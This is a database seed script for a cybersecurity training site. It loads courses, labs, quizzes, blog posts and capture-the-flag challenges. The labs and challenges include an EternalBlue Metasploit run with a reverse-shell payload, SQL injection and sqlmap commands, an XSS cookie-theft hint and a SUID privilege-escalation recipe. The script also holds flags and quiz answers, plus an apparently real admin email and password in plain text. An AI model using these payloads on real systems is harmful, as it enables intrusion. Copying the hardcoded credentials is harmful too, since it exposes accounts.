const mongoose = require('mongoose');
const dotenv = require('dotenv');

dotenv.config();

const User = require('./models/User');
const Course = require('./models/Course');
const Lab = require('./models/Lab');
const Quiz = require('./models/Quiz');
const Blog = require('./models/Blog');
const Certificate = require('./models/Certificate');
const Contact = require('./models/Contact');
const LearningPath = require('./models/LearningPath');
const Challenge = require('./models/Challenge');

const connectDB = async () => {
  const conn = await mongoose.connect(process.env.MONGO_URI);
  console.log(`MongoDB Connected: ${conn.connection.host}`);
};

const importData = async () => {
  try {
    await connectDB();

    // ── Drop old cybercodinghub database if it still exists ──
    try {
      const oldConn = await mongoose.createConnection(
        process.env.MONGO_URI.replace('/darkmodecyber', '/cybercodinghub')
      ).asPromise();
      await oldConn.dropDatabase();
      await oldConn.close();
      console.log('✔ Old cybercodinghub database dropped.');
    } catch (e) {
      console.log('ℹ cybercodinghub not found or already removed.');
    }

    // ── Clear ALL collections in darkmodecyber ──
    await User.deleteMany();
    await Course.deleteMany();
    await Lab.deleteMany();
    await Quiz.deleteMany();
    await Blog.deleteMany();
    await Certificate.deleteMany();
    await Contact.deleteMany();
    await LearningPath.deleteMany();
    await Challenge.deleteMany();
    console.log('✔ Collections cleared.');

    // ════════════════════════════════════════
    // 1. USERS  (use create() so pre-save password hashing runs)
    // ════════════════════════════════════════
    const adminUser = await User.create({
      name: 'Mulugeta Ababi',
      email: 'mulugetaababi237@gmail.com',
      password: 'Mulu4561644@',
      role: 'admin',
      isAdmin: true,
    });
    const studentUser = await User.create({
      name: 'Test Student',
      email: 'student@fanossec.com',
      password: 'student123',
      role: 'user',
      isAdmin: false,
    });
    const createdUsers = [adminUser, studentUser];
    console.log(`✔ ${createdUsers.length} users created`);

    // ════════════════════════════════════════
    // 2. COURSES
    // ════════════════════════════════════════
    const coursesData = [
      {
        title: 'Ethical Hacking Fundamentals',
        description: 'Learn the core concepts of ethical hacking, penetration testing methodologies, and how to think like an attacker to defend systems.',
        category: 'Penetration Testing',
        theoryContent: '<h2>Introduction to Ethical Hacking</h2><p>Ethical hacking involves legally breaking into computers and devices to test an organization\'s defenses.</p><h3>Key Topics</h3><ul><li>Reconnaissance & Footprinting</li><li>Scanning Networks</li><li>Enumeration</li><li>Vulnerability Analysis</li><li>System Hacking</li></ul>',
        videoUrl: 'https://www.youtube.com/embed/3Kq1MIfTWCE',
      },
      {
        title: 'Network Security Essentials',
        description: 'Master network security concepts including firewalls, IDS/IPS, VPNs, and network monitoring to protect infrastructure.',
        category: 'Network Security',
        theoryContent: '<h2>Network Security Fundamentals</h2><p>Network security consists of policies and practices to prevent unauthorized access, misuse, or denial of a computer network.</p><h3>Key Topics</h3><ul><li>Firewalls & Packet Filtering</li><li>Intrusion Detection Systems</li><li>VPN Technologies</li><li>Network Monitoring</li><li>Wireless Security</li></ul>',
        videoUrl: 'https://www.youtube.com/embed/E03gh1huvW4',
      },
      {
        title: 'Web Application Security',
        description: 'Deep dive into OWASP Top 10, SQL injection, XSS, CSRF, and how to secure modern web applications.',
        category: 'Web Security',
        theoryContent: '<h2>Web Application Security</h2><p>Web application security deals specifically with security of websites, web applications and web services.</p><h3>OWASP Top 10</h3><ul><li>Injection Attacks (SQL, NoSQL, OS)</li><li>Broken Authentication</li><li>Sensitive Data Exposure</li><li>Cross-Site Scripting (XSS)</li><li>Security Misconfiguration</li></ul>',
        videoUrl: 'https://www.youtube.com/embed/WtHnT73NaaQ',
      },
      {
        title: 'Malware Analysis & Reverse Engineering',
        description: 'Understand how malware works, analyze malicious code, and use reverse engineering tools to dissect threats.',
        category: 'Malware Analysis',
        theoryContent: '<h2>Malware Analysis</h2><p>Malware analysis is the study of determining the functionality, origin and potential impact of a given malware sample.</p><h3>Key Topics</h3><ul><li>Static Analysis Techniques</li><li>Dynamic Analysis & Sandboxing</li><li>Reverse Engineering with Ghidra/IDA</li><li>Ransomware Analysis</li><li>Rootkit Detection</li></ul>',
        videoUrl: 'https://www.youtube.com/embed/ivG3yq1QLOU',
      },
      {
        title: 'Digital Forensics & Incident Response',
        description: 'Learn how to investigate cyber incidents, collect digital evidence, and respond to security breaches effectively.',
        category: 'Forensics',
        theoryContent: '<h2>Digital Forensics</h2><p>Digital forensics encompasses the recovery, investigation, examination and analysis of material found in digital devices.</p><h3>Key Topics</h3><ul><li>Evidence Collection & Chain of Custody</li><li>Disk & Memory Forensics</li><li>Log Analysis</li><li>Incident Response Lifecycle</li><li>Forensic Tools: Autopsy, Volatility</li></ul>',
        videoUrl: 'https://www.youtube.com/embed/Vkjekr6jacg',
      },
    ];
    const createdCourses = await Course.insertMany(coursesData);
    console.log(`✔ ${createdCourses.length} courses created`);

    // ════════════════════════════════════════
    // 3. LABS
    // ════════════════════════════════════════
    const labsData = [
      {
        title: 'Nmap Network Scanning Lab',
        description: 'Practice using Nmap to discover hosts, open ports, and services on a target network.',
        instructions: '<h3>Step 1: Verify Nmap</h3><p><code>nmap --version</code></p><h3>Step 2: Host Discovery</h3><p><code>nmap -sn 192.168.1.0/24</code></p><h3>Step 3: Port Scanning</h3><p><code>nmap -sV -p 1-1000 &lt;target-ip&gt;</code></p><h3>Step 4: OS Detection</h3><p><code>nmap -O &lt;target-ip&gt;</code></p>',
        codeSnippets: [{ language: 'bash', code: '# Basic scan\nnmap 192.168.1.1\n\n# Service version detection\nnmap -sV 192.168.1.1\n\n# Aggressive scan\nnmap -A 192.168.1.1' }],
        course: createdCourses[0]._id,
      },
      {
        title: 'Metasploit Exploitation Lab',
        description: 'Use Metasploit Framework to exploit a vulnerable target machine in a controlled environment.',
        instructions: '<h3>Step 1: Start Metasploit</h3><p><code>msfconsole</code></p><h3>Step 2: Search for exploit</h3><p><code>search ms17-010</code></p><h3>Step 3: Use exploit</h3><p><code>use exploit/windows/smb/ms17_010_eternalblue</code></p><h3>Step 4: Set target and run</h3><p><code>set RHOSTS &lt;target-ip&gt;</code><br/><code>run</code></p>',
        codeSnippets: [{ language: 'bash', code: 'msfconsole\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.100\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST 192.168.1.50\nrun' }],
        course: createdCourses[0]._id,
      },
      {
        title: 'SQL Injection Attack Lab',
        description: 'Learn to identify and exploit SQL injection vulnerabilities using DVWA.',
        instructions: '<h3>Step 1: Setup DVWA</h3><p>Set security level to "Low".</p><h3>Step 2: Basic SQLi Test</h3><p>Enter: <code>\' OR \'1\'=\'1</code></p><h3>Step 3: Extract Data</h3><p><code>\' UNION SELECT user, password FROM users-- -</code></p><h3>Step 4: Use SQLMap</h3><p><code>sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1" --dbs</code></p>',
        codeSnippets: [{ language: 'sql', code: "-- Basic test\n' OR '1'='1\n\n-- Union-based extraction\n' UNION SELECT null, table_name FROM information_schema.tables-- -" }],
        course: createdCourses[2]._id,
      },
      {
        title: 'Burp Suite Web Proxy Lab',
        description: 'Intercept, inspect and modify HTTP requests using Burp Suite to find web vulnerabilities.',
        instructions: '<h3>Step 1: Configure Browser Proxy</h3><p>Set proxy to 127.0.0.1:8080</p><h3>Step 2: Intercept Requests</h3><p>Enable intercept in Burp Proxy tab.</p><h3>Step 3: Scan for Vulnerabilities</h3><p>Use the Scanner module on the target URL.</p><h3>Step 4: Intruder Attack</h3><p>Send a request to Intruder and fuzz parameters.</p>',
        codeSnippets: [{ language: 'bash', code: '# Start Burp Suite\njava -jar burpsuite_community.jar\n\n# Or use the installed version\nburpsuite' }],
        course: createdCourses[2]._id,
      },
      {
        title: 'Wireshark Packet Analysis Lab',
        description: 'Capture and analyze network traffic using Wireshark to identify suspicious activity.',
        instructions: '<h3>Step 1: Install Wireshark</h3><p><code>sudo apt install wireshark</code></p><h3>Step 2: Capture Traffic</h3><p>Select your network interface and start capturing.</p><h3>Step 3: Apply Filters</h3><p>Use filters like <code>http</code>, <code>dns</code>, <code>tcp.port == 80</code></p><h3>Step 4: Follow TCP Stream</h3><p>Right-click → Follow → TCP Stream</p>',
        codeSnippets: [{ language: 'bash', code: '# Capture on interface eth0\ntshark -i eth0 -w capture.pcap\n\n# Filter HTTP traffic\ntshark -r capture.pcap -Y "http"' }],
        course: createdCourses[1]._id,
      },
      {
        title: 'Memory Forensics with Volatility',
        description: 'Analyze memory dumps to find malware artifacts, running processes, and network connections.',
        instructions: '<h3>Step 1: Install Volatility</h3><p><code>pip install volatility3</code></p><h3>Step 2: Identify Profile</h3><p><code>vol.py -f memory.dmp imageinfo</code></p><h3>Step 3: List Processes</h3><p><code>vol.py -f memory.dmp pslist</code></p><h3>Step 4: Network Connections</h3><p><code>vol.py -f memory.dmp netscan</code></p>',
        codeSnippets: [{ language: 'bash', code: 'vol.py -f memory.dmp pslist\nvol.py -f memory.dmp netscan\nvol.py -f memory.dmp malfind' }],
        course: createdCourses[4]._id,
      },
    ];
    const createdLabs = await Lab.insertMany(labsData);
    console.log(`✔ ${createdLabs.length} labs created`);

    // ════════════════════════════════════════
    // 4. QUIZZES
    // ════════════════════════════════════════
    const quizzesData = [
      {
        title: 'Ethical Hacking Fundamentals Quiz',
        course: createdCourses[0]._id,
        questions: [
          { questionText: 'What is the first phase of ethical hacking?', options: ['Scanning', 'Reconnaissance', 'Exploitation', 'Reporting'], correctAnswer: 'Reconnaissance', explanation: 'Reconnaissance is the first phase where attackers gather information about the target.' },
          { questionText: 'Which tool is commonly used for network scanning?', options: ['Metasploit', 'Burp Suite', 'Nmap', 'Wireshark'], correctAnswer: 'Nmap', explanation: 'Nmap is the industry-standard tool for network discovery and security auditing.' },
          { questionText: 'What does CVE stand for?', options: ['Common Vulnerability Exposure', 'Common Vulnerabilities and Exposures', 'Cyber Vulnerability Entry', 'Critical Vulnerability Exploit'], correctAnswer: 'Common Vulnerabilities and Exposures', explanation: 'CVE is a list of publicly disclosed cybersecurity vulnerabilities maintained by MITRE.' },
          { questionText: 'Which hacker type operates with full permission of the target?', options: ['Black Hat', 'Grey Hat', 'White Hat', 'Script Kiddie'], correctAnswer: 'White Hat', explanation: 'White hat hackers are authorized to test systems and help improve security.' },
          { questionText: 'What is a zero-day vulnerability?', options: ['A vulnerability patched on day zero', 'An unknown vulnerability with no available patch', 'A vulnerability discovered 0 days ago', 'A low severity bug'], correctAnswer: 'An unknown vulnerability with no available patch', explanation: 'Zero-day vulnerabilities are unknown to the vendor and have no patch available.' },
        ],
      },
      {
        title: 'Network Security Quiz',
        course: createdCourses[1]._id,
        questions: [
          { questionText: 'What is the purpose of a DMZ in network security?', options: ['To encrypt all traffic', 'To isolate public-facing servers from the internal network', 'To block all incoming connections', 'To monitor user activity'], correctAnswer: 'To isolate public-facing servers from the internal network', explanation: 'A DMZ separates public-facing services from the internal network.' },
          { questionText: 'Which protocol does HTTPS use for encryption?', options: ['SSL', 'TLS', 'IPSec', 'SSH'], correctAnswer: 'TLS', explanation: 'Modern HTTPS uses TLS. SSL is deprecated due to known vulnerabilities.' },
          { questionText: 'What does IDS stand for?', options: ['Internet Defense System', 'Intrusion Detection System', 'Internal Data Security', 'Integrated Defense Suite'], correctAnswer: 'Intrusion Detection System', explanation: 'An IDS monitors network traffic for suspicious activity and known threats.' },
          { questionText: 'Which port does SSH use by default?', options: ['21', '22', '23', '443'], correctAnswer: '22', explanation: 'SSH (Secure Shell) uses port 22 by default for encrypted remote connections.' },
        ],
      },
      {
        title: 'Web Application Security Quiz',
        course: createdCourses[2]._id,
        questions: [
          { questionText: 'What does XSS stand for?', options: ['Cross-Site Scripting', 'Cross-Server Security', 'External Script Source', 'Cross-System Scanning'], correctAnswer: 'Cross-Site Scripting', explanation: 'XSS allows attackers to inject malicious scripts into web pages viewed by other users.' },
          { questionText: 'Which OWASP category covers SQL Injection?', options: ['Broken Authentication', 'Injection', 'Security Misconfiguration', 'Sensitive Data Exposure'], correctAnswer: 'Injection', explanation: 'SQL Injection falls under the Injection category in the OWASP Top 10.' },
          { questionText: 'What HTTP header prevents clickjacking?', options: ['Content-Security-Policy', 'X-Frame-Options', 'Strict-Transport-Security', 'X-XSS-Protection'], correctAnswer: 'X-Frame-Options', explanation: 'X-Frame-Options prevents the page from being embedded in iframes.' },
          { questionText: 'What is CSRF?', options: ['Cross-Site Request Forgery', 'Client-Side Request Filter', 'Cross-Server Resource Fetch', 'Content Security Request Flag'], correctAnswer: 'Cross-Site Request Forgery', explanation: 'CSRF tricks authenticated users into submitting malicious requests unknowingly.' },
        ],
      },
      {
        title: 'Malware Analysis Quiz',
        course: createdCourses[3]._id,
        questions: [
          { questionText: 'What is static malware analysis?', options: ['Running malware in a sandbox', 'Analyzing malware without executing it', 'Monitoring malware network traffic', 'Reverse engineering at runtime'], correctAnswer: 'Analyzing malware without executing it', explanation: 'Static analysis examines malware code and structure without running it.' },
          { questionText: 'Which tool is used for reverse engineering binaries?', options: ['Wireshark', 'Nmap', 'Ghidra', 'Burp Suite'], correctAnswer: 'Ghidra', explanation: 'Ghidra is a free reverse engineering tool developed by the NSA.' },
          { questionText: 'What is a sandbox in malware analysis?', options: ['A secure coding environment', 'An isolated environment to safely run malware', 'A type of firewall', 'A network monitoring tool'], correctAnswer: 'An isolated environment to safely run malware', explanation: 'A sandbox provides an isolated environment to execute and observe malware behavior.' },
        ],
      },
      {
        title: 'Digital Forensics Quiz',
        course: createdCourses[4]._id,
        questions: [
          { questionText: 'What is chain of custody in digital forensics?', options: ['A blockchain security protocol', 'Documentation tracking evidence handling', 'A network monitoring technique', 'An encryption standard'], correctAnswer: 'Documentation tracking evidence handling', explanation: 'Chain of custody documents who handled evidence and when, ensuring its integrity.' },
          { questionText: 'Which tool is used for memory forensics?', options: ['Autopsy', 'Volatility', 'Wireshark', 'Metasploit'], correctAnswer: 'Volatility', explanation: 'Volatility is the leading open-source memory forensics framework.' },
          { questionText: 'What does DFIR stand for?', options: ['Digital Forensics and Incident Response', 'Data Firewall and Intrusion Reporting', 'Defense Framework for IR', 'Digital File Integrity Review'], correctAnswer: 'Digital Forensics and Incident Response', explanation: 'DFIR combines digital forensics investigation with incident response procedures.' },
        ],
      },
    ];
    const createdQuizzes = await Quiz.insertMany(quizzesData);
    console.log(`✔ ${createdQuizzes.length} quizzes created`);

    // ════════════════════════════════════════
    // 5. BLOGS
    // ════════════════════════════════════════
    const blogsData = [
      {
        title: 'Top 10 Cybersecurity Threats in 2025',
        content: '<h2>The Evolving Threat Landscape</h2><p>As we move deeper into 2025, the cybersecurity landscape continues to evolve rapidly. Organizations face increasingly sophisticated attacks from nation-state actors, ransomware groups, and opportunistic cybercriminals.</p><h3>1. AI-Powered Attacks</h3><p>Attackers leverage artificial intelligence to automate reconnaissance, craft convincing phishing emails, and bypass traditional security controls.</p><h3>2. Ransomware-as-a-Service</h3><p>The commoditization of ransomware has lowered the barrier to entry, leading to a surge in attacks targeting critical infrastructure.</h3><h3>3. Supply Chain Attacks</h3><p>Compromising trusted software vendors to distribute malware to thousands of downstream customers remains highly effective.</p>',
        author: 'Mulugeta Ababi',
      },
      {
        title: 'Getting Started with Bug Bounty Hunting',
        content: '<h2>Your Path to Bug Bounty Success</h2><p>Bug bounty programs offer security researchers the opportunity to earn rewards for responsibly disclosing vulnerabilities.</p><h3>Choose Your Platform</h3><p>Start with HackerOne, Bugcrowd, or Intigriti. These platforms host programs from hundreds of companies.</p><h3>Learn the Basics First</h3><p>Ensure you have a solid understanding of web technologies, HTTP, JavaScript, and common vulnerability classes like XSS, SQLi, and IDOR.</p><h3>Start Small</h3><p>Begin with programs that have a wide scope and are beginner-friendly. Read disclosed reports to learn from others.</p>',
        author: 'Mulugeta Ababi',
      },
      {
        title: 'Setting Up Your Home Cybersecurity Lab',
        content: '<h2>Build Your Own Hacking Lab</h2><p>A home lab is essential for practicing cybersecurity skills in a safe, legal environment.</p><h3>Virtualization Software</h3><p>Use VirtualBox (free) or VMware Workstation to run multiple virtual machines.</p><h3>Essential VMs to Install</h3><ul><li>Kali Linux - Your primary attack machine</li><li>Metasploitable 2/3 - Intentionally vulnerable Linux</li><li>DVWA - Damn Vulnerable Web Application</li><li>Windows Server - For Active Directory labs</li></ul>',
        author: 'Mulugeta Ababi',
      },
      {
        title: 'Understanding the MITRE ATT&CK Framework',
        content: '<h2>What is MITRE ATT&CK?</h2><p>MITRE ATT&CK is a globally-accessible knowledge base of adversary tactics and techniques based on real-world observations.</p><h3>Why It Matters</h3><p>Security teams use ATT&CK to understand attacker behavior, improve detection capabilities, and prioritize defensive measures.</p><h3>Key Components</h3><ul><li>Tactics - The why (attacker goals)</li><li>Techniques - The how (methods used)</li><li>Procedures - Specific implementations</li></ul>',
        author: 'Mulugeta Ababi',
      },
      {
        title: 'Linux Command Line for Hackers',
        content: '<h2>Essential Linux Commands for Security Professionals</h2><p>Mastering the Linux command line is fundamental for any cybersecurity professional. Most hacking tools run on Linux.</p><h3>File System Navigation</h3><p><code>ls -la</code>, <code>cd</code>, <code>pwd</code>, <code>find</code>, <code>locate</code></p><h3>Network Commands</h3><p><code>ifconfig</code>, <code>netstat</code>, <code>ss</code>, <code>ping</code>, <code>traceroute</code>, <code>curl</code></p><h3>Process Management</h3><p><code>ps aux</code>, <code>top</code>, <code>kill</code>, <code>chmod</code>, <code>chown</code></p>',
        author: 'Mulugeta Ababi',
      },
    ];
    const createdBlogs = await Blog.insertMany(blogsData);
    console.log(`✔ ${createdBlogs.length} blogs created`);

    // ════════════════════════════════════════
    // 6. CERTIFICATES (sample for admin user)
    // ════════════════════════════════════════
    const certificatesData = [
      {
        user: createdUsers[0]._id,
        course: createdCourses[0]._id,
        certificateId: 'DMC-100001',
        issuedAt: new Date(),
        pdfUrl: '/public/certificates/DMC-100001.pdf',
      },
      {
        user: createdUsers[1]._id,
        course: createdCourses[1]._id,
        certificateId: 'DMC-100002',
        issuedAt: new Date(),
        pdfUrl: '/public/certificates/DMC-100002.pdf',
      },
    ];
    const createdCertificates = await Certificate.insertMany(certificatesData);
    console.log(`✔ ${createdCertificates.length} certificates created`);

    // ════════════════════════════════════════
    // 7. CONTACTS (sample messages)
    // ════════════════════════════════════════
    const contactsData = [
      {
        name: 'Abebe Kebede',
        email: 'abebe@example.com',
        message: 'I am very interested in the Ethical Hacking course. When does the next cohort start?',
        isRead: false,
      },
      {
        name: 'Tigist Haile',
        email: 'tigist@example.com',
        message: 'I completed the Network Security course and would like to receive my certificate. Please advise.',
        isRead: true,
      },
      {
        name: 'Dawit Tesfaye',
        email: 'dawit@example.com',
        message: 'Great platform! I love the dark theme and the practical labs. Keep up the amazing work.',
        isRead: false,
      },
    ];
    const createdContacts = await Contact.insertMany(contactsData);
    console.log(`✔ ${createdContacts.length} contacts created`);

    // ════════════════════════════════════════
    // Link labs & quizzes back to courses
    // ════════════════════════════════════════
    await Course.findByIdAndUpdate(createdCourses[0]._id, {
      labs: [createdLabs[0]._id, createdLabs[1]._id],
      quizzes: [createdQuizzes[0]._id],
    });
    await Course.findByIdAndUpdate(createdCourses[1]._id, {
      labs: [createdLabs[4]._id],
      quizzes: [createdQuizzes[1]._id],
    });
    await Course.findByIdAndUpdate(createdCourses[2]._id, {
      labs: [createdLabs[2]._id, createdLabs[3]._id],
      quizzes: [createdQuizzes[2]._id],
    });
    await Course.findByIdAndUpdate(createdCourses[3]._id, {
      labs: [],
      quizzes: [createdQuizzes[3]._id],
    });
    await Course.findByIdAndUpdate(createdCourses[4]._id, {
      labs: [createdLabs[5]._id],
      quizzes: [createdQuizzes[4]._id],
    });

    // Link certificates to user progress
    await User.findByIdAndUpdate(createdUsers[0]._id, {
      'progress.coursesCompleted': [createdCourses[0]._id],
      'progress.certificatesEarned': [createdCertificates[0]._id],
    });
    await User.findByIdAndUpdate(createdUsers[1]._id, {
      'progress.coursesCompleted': [createdCourses[1]._id],
      'progress.certificatesEarned': [createdCertificates[1]._id],
    });

    // ════════════════════════════════════════
    // 8. LEARNING PATHS
    // ════════════════════════════════════════
    const pathsData = [
      {
        title: 'Penetration Tester',
        description: 'Master the art of ethical hacking from reconnaissance to full exploitation. Follow this path to become a certified penetration tester.',
        difficulty: 'Intermediate',
        icon: '🎯',
        color: '#FF003C',
        estimatedHours: 40,
        courses: [createdCourses[0]._id, createdCourses[1]._id],
      },
      {
        title: 'Web Security Specialist',
        description: 'Deep dive into web application vulnerabilities, OWASP Top 10, and modern web defense techniques.',
        difficulty: 'Beginner',
        icon: '🌐',
        color: '#00FFFF',
        estimatedHours: 25,
        courses: [createdCourses[2]._id],
      },
      {
        title: 'Malware Analyst',
        description: 'Learn to dissect, analyze, and reverse engineer malware samples to understand threats and build defenses.',
        difficulty: 'Advanced',
        icon: '🦠',
        color: '#FF6B00',
        estimatedHours: 50,
        courses: [createdCourses[3]._id],
      },
      {
        title: 'Digital Forensics Investigator',
        description: 'Develop skills to investigate cyber incidents, collect digital evidence, and respond to breaches professionally.',
        difficulty: 'Intermediate',
        icon: '🔍',
        color: '#9B59B6',
        estimatedHours: 35,
        courses: [createdCourses[4]._id],
      },
    ];
    const createdPaths = await LearningPath.insertMany(pathsData);
    console.log(`✔ ${createdPaths.length} learning paths created`);

    // ════════════════════════════════════════
    // 9. SECURITY CHALLENGES
    // ════════════════════════════════════════
    const challengesData = [
      {
        title: 'SQLi Vault Infiltration',
        slug: 'sqli-vault-infiltration',
        category: 'Web Security',
        difficulty: 'Easy',
        points: 50,
        description: 'Bypass a legacy login form by exploiting an unsanitized SQL query in the backend authentication logic.',
        scenario: 'A target financial firm uses an outdated parameter query to verify administrative credentials.',
        instructions: 'Analyze the login parameter and use standard tautology payload to authenticate without credentials.',
        hints: [{ text: 'Think about basic SQL boolean conditions like \' OR \'1\'=\'1', cost: 10 }],
        flag: 'FANOS{sql1_auth_byp4ss_m4st3r}',
        tags: ['SQLi', 'Web', 'Authentication'],
        author: 'FANOS SEC Offensive Ops'
      },
      {
        title: 'XSS Cookie Heist',
        slug: 'xss-cookie-heist',
        category: 'Web Security',
        difficulty: 'Medium',
        points: 100,
        description: 'Identify a stored Cross-Site Scripting vulnerability in a user feedback board to extract administrator session tokens.',
        scenario: 'The internal admin review dashboard renders user comments without HTML sanitization or CSP headers.',
        instructions: 'Craft an SVG or script payload that steals document.cookie upon rendering in the admin browser context.',
        hints: [{ text: 'Try using <svg/onload=fetch(...)> to trigger an asynchronous HTTP beacon.', cost: 20 }],
        flag: 'FANOS{xss_s3ss10n_st0l3n_pr0t0c0l}',
        tags: ['XSS', 'Web', 'DOM'],
        author: 'FANOS SEC Offensive Ops'
      },
      {
        title: 'PCAP Traffic Interception',
        slug: 'pcap-traffic-interception',
        category: 'Network Security',
        difficulty: 'Easy',
        points: 60,
        description: 'Analyze an encrypted network packet capture to reconstruct an unencrypted FTP session and recover intercepted credentials.',
        scenario: 'An attacker exfiltrated proprietary firmware over an legacy FTP protocol inside the enterprise DMZ.',
        instructions: 'Open the packet capture file with Wireshark, filter for FTP traffic, and inspect the authentication command stream.',
        hints: [{ text: 'Look for USER and PASS FTP command sequences in Wireshark filters.', cost: 15 }],
        flag: 'FANOS{n3tw0rk_p4ck3t_sn1ff3d_cl34r}',
        tags: ['PCAP', 'Wireshark', 'FTP'],
        author: 'FANOS SEC Blue Team'
      },
      {
        title: 'Memory Dump Malware Hunt',
        slug: 'memory-dump-malware-hunt',
        category: 'Digital Forensics',
        difficulty: 'Hard',
        points: 150,
        description: 'Examine a volatility memory image to identify injected DLLs, anomalous process trees, and hidden persistence handles.',
        scenario: 'A workstation in the corporate accounting division exhibited anomalous outbound beaconing to a known C2 server.',
        instructions: 'Use Volatility pslist, malfind, and netscan to trace the malicious payload PID and locate the hidden flag string.',
        hints: [{ text: 'Inspect malfind protection flags with PAGE_EXECUTE_READWRITE permissions.', cost: 30 }],
        flag: 'FANOS{m3m0ry_f0r3ns1cs_v0l4t1l1ty_pr0}',
        tags: ['Forensics', 'Memory', 'Volatility'],
        author: 'FANOS SEC DFIR'
      },
      {
        title: 'RSA Weak Key Cryptanalysis',
        slug: 'rsa-weak-key-cryptanalysis',
        category: 'Cryptography',
        difficulty: 'Medium',
        points: 120,
        description: 'Factorize a vulnerable RSA public modulus generated with small prime factors and decrypt the secret ciphertext.',
        scenario: 'An outdated IoT gateway implemented custom key generation with predictable prime entropy.',
        instructions: 'Use Fermat factorization or Wiener attack algorithms to compute private key exponent d and decode ASCII plaintext.',
        hints: [{ text: 'Check if p and q are relatively close to each other to apply Fermat method.', cost: 25 }],
        flag: 'FANOS{crypt0_rs4_f3rm4t_f4ct0r_br0k3n}',
        tags: ['Crypto', 'RSA', 'Math'],
        author: 'FANOS SEC Research'
      },
      {
        title: 'Linux SUID Binary Exploitation',
        slug: 'linux-suid-binary-exploitation',
        category: 'Privilege Escalation',
        difficulty: 'Medium',
        points: 110,
        description: 'Discover misconfigured SUID binaries on a hardened Linux distribution and escalate privileges to root.',
        scenario: 'A custom backup helper binary runs with root SUID permissions and invokes system binaries without absolute paths.',
        instructions: 'Inspect SUID binaries using find / -perm -4000, hijack the PATH variable, and spawn an interactive root shell.',
        hints: [{ text: 'Manipulate the PATH variable to execute your malicious script before /bin or /usr/bin.', cost: 20 }],
        flag: 'FANOS{su1d_p4th_h1j4ck_r00t_0wn3d}',
        tags: ['Linux', 'PrivEsc', 'SUID'],
        author: 'FANOS SEC Red Team'
      }
    ];
    const createdChallenges = await Challenge.insertMany(challengesData);
    console.log(`✔ ${createdChallenges.length} security challenges created`);

    console.log('\n✅ FANOS SEC database fully seeded!');
    console.log('════════════════════════════════════════');
    console.log('Collections: users, courses, labs, quizzes, blogs, certificates, contacts, learningpaths, challenges');
    console.log('════════════════════════════════════════');
    process.exit();
  } catch (error) {
    console.error(`❌ Error: ${error.message}`);
    process.exit(1);
  }
};

importData();
